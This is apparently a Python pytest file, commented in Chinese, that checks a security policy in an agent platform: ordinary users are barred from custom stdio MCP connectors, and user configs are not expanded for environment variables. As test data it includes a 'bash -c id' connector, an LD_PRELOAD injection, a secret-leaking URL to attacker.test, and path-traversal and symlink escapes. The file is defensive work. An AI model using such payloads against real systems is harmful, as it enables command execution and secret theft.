"""SEC-04：普通用户不能运行自定义 stdio 连接器；用户 mcp.json 不做 ${VAR} 展开。

stdio 连接器在宿主机、沙箱外拉起进程。改造前任何登录用户都能提交 stdio 配置（等于
沙箱外的 shell），用户 mcp.json 里的 ``${EASY_JWT_SECRET}`` 也会被展开后带出去。
"""

from __future__ import annotations

import json

import pytest

import easy_agent.services.connectors as connectors_service
from easy_agent.bootstrap.config import Config
from easy_agent.services import mcp as mcp_service
from easy_agent.services.mcp_policy import (
    McpPolicyError,
    ensure_servers_allowed,
    filter_server_names,
    is_stdio,
    normalize_workspace_paths,
    stdio_violation,
)

CATALOG = [
    {
        "id": "mysql",
        "name": "MySQL",
        "config": {
            "type": "stdio",
            "command": "uvx",
            "args": ["mysql-mcp", "--readonly"],
            "env": {"MYSQL_HOST": "", "MYSQL_PASSWORD": ""},
        },
        "fields": [{"key": "env.MYSQL_HOST"}, {"key": "env.MYSQL_PASSWORD"}],
    },
    {
        "id": "web",
        "name": "Web",
        "config": {"transport": "streamable_http", "url": "https://example.test/mcp"},
        "fields": [],
    },
    {
        "id": "sqlite",
        "name": "SQLite",
        "config": {
            "type": "stdio",
            "command": "uvx",
            "args": ["db-mcp-server"],
            "env": {"DB_TYPE": "sqlite", "DB_PATH": ""},
        },
        "fields": [{"key": "env.DB_PATH", "path": "workspace"}],
    },
]


@pytest.fixture(autouse=True)
def catalog(monkeypatch):
    monkeypatch.setattr(connectors_service, "load_catalog", lambda path=None: CATALOG)


def _mysql(**env):
    return {
        "transport": "stdio",
        "command": "uvx",
        "args": ["mysql-mcp", "--readonly"],
        "env": {"MYSQL_HOST": "db.internal", "MYSQL_PASSWORD": "pw", **env},
        "enabled": True,
    }


def test_is_stdio_matches_normalization_rules():
    assert is_stdio({"type": "stdio", "command": "x"})
    assert is_stdio({"transport": "STDIO"})
    assert is_stdio({"command": "x"})  # 没写传输类型、有 command 即 stdio
    assert not is_stdio({"url": "https://example.test/mcp"})
    assert not is_stdio({"transport": "sse", "url": "https://example.test/sse"})


def test_custom_stdio_is_rejected_for_regular_users():
    reason = stdio_violation({"command": "bash", "args": ["-c", "id"]}, "alice")
    assert "stdio" in reason


def test_admin_and_http_servers_are_not_restricted():
    assert stdio_violation({"command": "bash", "args": ["-c", "id"]}, "admin") == ""
    assert stdio_violation({"transport": "sse", "url": "https://x.test/sse"}, "alice") == ""


def test_catalog_stdio_with_declared_fields_filled_is_allowed():
    assert stdio_violation(_mysql(), "alice") == ""
    # 没填的可选字段也算一致
    cfg = _mysql()
    del cfg["env"]["MYSQL_PASSWORD"]
    assert stdio_violation(cfg, "alice") == ""


@pytest.mark.parametrize(
    "mutate",
    [
        lambda c: c.update(command="bash"),
        lambda c: c["args"].append("--write"),
        lambda c: c["env"].update(LD_PRELOAD="/tmp/evil.so"),
        lambda c: c.update(cwd="/"),
    ],
    ids=["command", "extra-arg", "undeclared-env", "cwd"],
)
def test_catalog_stdio_cannot_change_undeclared_parts(mutate):
    cfg = _mysql()
    mutate(cfg)
    assert stdio_violation(cfg, "alice")


def test_ensure_servers_allowed_names_the_offending_server():
    with pytest.raises(McpPolicyError, match="evil"):
        ensure_servers_allowed({"ok": _mysql(), "evil": {"command": "sh"}}, "alice")
    ensure_servers_allowed({"evil": {"command": "sh"}}, "admin")


@pytest.fixture()
def user_mcp(tmp_path, monkeypatch):
    def _path(username, config=None):
        return tmp_path / username / "mcp.json"

    monkeypatch.setattr(Config, "get_user_mcp_path", classmethod(lambda cls, u, c=None: _path(u)))

    def write(username, servers):
        path = _path(username)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({"servers": servers}), encoding="utf-8")
        return path

    return write


def test_agent_loading_skips_disallowed_stdio(user_mcp):
    user_mcp(
        "alice",
        {
            "mysql": _mysql(),
            "evil": {"command": "bash", "args": ["-c", "id"]},
            "web": {"transport": "streamable_http", "url": "https://x.test/mcp"},
        },
    )
    assert filter_server_names("alice", None) == ["mysql", "web"]
    assert filter_server_names("alice", ["evil", "web"]) == ["web"]


def test_agent_loading_keeps_selection_untouched_without_violations(user_mcp):
    user_mcp("alice", {"web": {"transport": "streamable_http", "url": "https://x.test/mcp"}})
    assert filter_server_names("alice", None) is None
    assert filter_server_names("alice", ["web"]) == ["web"]


def test_user_mcp_json_is_not_env_expanded(user_mcp, monkeypatch):
    monkeypatch.setenv("SEC04_SERVER_SECRET", "top-secret-value")
    url = "https://attacker.test/collect?k=${SEC04_SERVER_SECRET}"
    user_mcp("alice", {"leak": {"transport": "streamable_http", "url": url}})

    assert mcp_service.load_mcp_config("alice")["leak"]["url"] == url
    assert mcp_service.load_user_mcp_config("alice")["leak"]["url"] == url


def test_global_mcp_json_is_still_env_expanded(tmp_path, monkeypatch):
    """管理员维护的全局文件照常展开（用户没有自己的 mcp.json 时回退到它）。"""
    monkeypatch.setenv("SEC04_ADMIN_TOKEN", "admin-token")
    global_file = tmp_path / "global-mcp.json"
    global_file.write_text(
        json.dumps({"servers": {"g": {"transport": "sse", "url": "https://x.test/${SEC04_ADMIN_TOKEN}"}}}),
        encoding="utf-8",
    )
    monkeypatch.setattr(mcp_service, "_find_mcp_config", lambda: global_file)
    monkeypatch.setattr(
        Config, "get_user_mcp_path", classmethod(lambda cls, u, c=None: tmp_path / "none" / "mcp.json")
    )
    assert mcp_service.load_mcp_config("alice")["g"]["url"] == "https://x.test/admin-token"


# ── 工作区路径字段：sqlite 连接器的 DB_PATH 只能指向用户自己的工作区 ────────


@pytest.fixture()
def workspaces(tmp_path, monkeypatch):
    monkeypatch.setattr(
        Config, "get_user_workspace_dir", classmethod(lambda cls, u, c=None: tmp_path / "ws" / u)
    )
    (tmp_path / "ws" / "alice").mkdir(parents=True)
    return tmp_path


def _sqlite(db_path):
    return {
        "transport": "stdio",
        "command": "uvx",
        "args": ["db-mcp-server"],
        "env": {"DB_TYPE": "sqlite", "DB_PATH": db_path},
    }


def test_sqlite_path_inside_own_workspace_is_allowed(workspaces):
    db = workspaces / "ws" / "alice" / "data" / "sales.db"
    assert stdio_violation(_sqlite(str(db)), "alice") == ""


def test_sqlite_path_outside_own_workspace_is_rejected(workspaces):
    app_db = workspaces / "data" / "easy_agent.db"  # 应用自己的业务库
    escape = workspaces / "ws" / "alice" / ".." / "bob" / "x.db"
    link = workspaces / "ws" / "alice" / "link.db"
    link.symlink_to(app_db)
    for db in (app_db, escape, link):
        assert "工作区" in stdio_violation(_sqlite(str(db)), "alice"), db


def test_relative_path_is_moved_into_the_workspace_on_write(workspaces):
    prepared = normalize_workspace_paths({"db": _sqlite("data/sales.db")}, "alice")
    expected = (workspaces / "ws" / "alice").resolve() / "data" / "sales.db"
    assert prepared["db"]["env"]["DB_PATH"] == str(expected)
    assert stdio_violation(prepared["db"], "alice") == ""
    # 没换算过的相对路径会被 stdio 进程按服务进程目录解析，必须拒绝
    assert stdio_violation(_sqlite("data/sales.db"), "alice")
    # 相对路径也不能借 .. 逃出去
    escaped = normalize_workspace_paths({"db": _sqlite("../bob/x.db")}, "alice")
    assert stdio_violation(escaped["db"], "alice")


def test_admin_sqlite_path_is_not_restricted(workspaces):
    assert stdio_violation(_sqlite("/srv/data/easy_agent.db"), "admin") == ""
    assert normalize_workspace_paths({"db": _sqlite("rel.db")}, "admin")["db"]["env"]["DB_PATH"] == "rel.db"
